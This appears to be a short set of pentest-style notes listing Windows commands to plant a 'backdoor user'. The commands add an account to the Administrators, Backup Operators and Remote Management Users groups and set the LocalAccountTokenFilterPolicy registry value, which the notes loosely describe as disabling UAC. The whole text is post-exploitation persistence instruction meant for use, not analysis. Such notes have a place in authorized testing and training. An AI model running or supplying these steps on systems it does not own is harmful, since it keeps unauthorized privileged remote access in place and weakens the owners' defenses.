List users

> net user

Add user to administrators.

> net localgroup administrators <username> /add

Add to backup users.

> Net localgroup "Backup Operators" <username> /add

Add to Remote Management Users

> net localgroup "Remote Management Users" <username> /add

If there are problems with the backdoor user you can disable UAC.

> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /t REG_DWORD /v LocalAccounttokenFilterPolicy /d 1


